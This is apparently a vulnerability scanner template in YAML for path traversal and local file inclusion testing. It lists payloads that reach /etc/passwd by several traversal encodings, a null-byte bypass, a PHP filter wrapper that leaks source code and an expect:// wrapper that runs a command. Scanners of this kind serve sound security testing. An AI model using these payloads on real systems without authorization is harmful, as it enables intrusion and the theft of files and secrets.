id: generic-path-traversal
info:
  name: Path Traversal
  severity: high
  description: Generic path traversal / local file inclusion testing
  tags:
    - path-traversal
    - lfi
    - generic

generic:
  endpoint: "{{path_traversal}}"

  method: GET

  parameter: "file"

  payloads:
    - name: "etc_passwd_dots"
      value: "../../../../../etc/passwd"
      description: "Dot-slash traversal"

    - name: "etc_passwd_urlencoded"
      value: "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
      description: "URL encoded traversal"

    - name: "etc_passwd_double"
      value: "..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
      description: "Windows backslash traversal"

    - name: "null_byte"
      value: "../../../etc/passwd%00.jpg"
      description: "Null byte bypass"

    - name: "php_filter"
      value: "php://filter/convert.base64-encode/resource=index.php"
      description: "PHP filter wrapper"

    - name: "wrapper_expect"
      value: "expect://id"
      description: "PHP expect wrapper"

  matchers:
    - type: word
      words:
        - "root:x:0:0"
        - "/bin/bash"
        - "/bin/sh"
        - "nobody:"
        - "<?php"
        - "<?PHP"
      condition: or
